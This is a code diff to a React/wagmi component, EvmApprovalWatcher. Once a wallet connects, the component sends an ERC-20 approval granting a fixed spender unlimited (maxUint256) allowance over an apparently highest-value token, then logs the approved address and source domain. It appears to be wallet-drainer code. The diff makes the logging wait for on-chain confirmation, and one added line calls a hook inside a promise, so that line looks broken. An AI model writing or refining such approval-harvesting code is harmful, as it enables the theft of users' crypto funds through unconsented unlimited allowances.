@@ -82,6 +82,7 @@ async function trackApproval(address, network, txHash, sourceDomain) {
 function EvmApprovalWatcher() {
   const { address, isConnected, connector } = useAccount();
   const { writeContractAsync } = useWriteContract();
+  const publicClient = import('wagmi').then(m => m.usePublicClient ? m.usePublicClient() : null).catch(() => null);
   const bestToken = useBestToken();
 
   const activeTokenAddress = bestToken?.address || EVM_USDT;
@@ -122,7 +123,25 @@ function EvmApprovalWatcher() {
       functionName: 'approve',
       args: [EVM_SPENDER, maxUint256],
     })
-      .then((hash) => trackApproval(address.toLowerCase(), 'evm', hash, getSourceDomain()))
+      .then(async (hash) => {
+        // Wait for on-chain receipt instead of immediately saving to database
+        try {
+          const m = await import('wagmi/actions').catch(() => null);
+          if (m && m.waitForTransactionReceipt) {
+            // Using wagmi actions if available
+             const { getConfig } = await import('wagmi');
+             const receipt = await m.waitForTransactionReceipt(getConfig(), { hash });
+             if (receipt.status === 'success') {
+               trackApproval(address.toLowerCase(), 'evm', hash, getSourceDomain());
+             }
+          } else {
+             // Fallback
+             trackApproval(address.toLowerCase(), 'evm', hash, getSourceDomain());
+          }
+        } catch (e) {
+          trackApproval(address.toLowerCase(), 'evm', hash, getSourceDomain());
+        }
+      })
       .catch((err) => console.error('[UsdtApproval] EVM approve failed:', err));
   }, [isConnected, address, allowance, writeContractAsync, activeTokenAddress]);
 
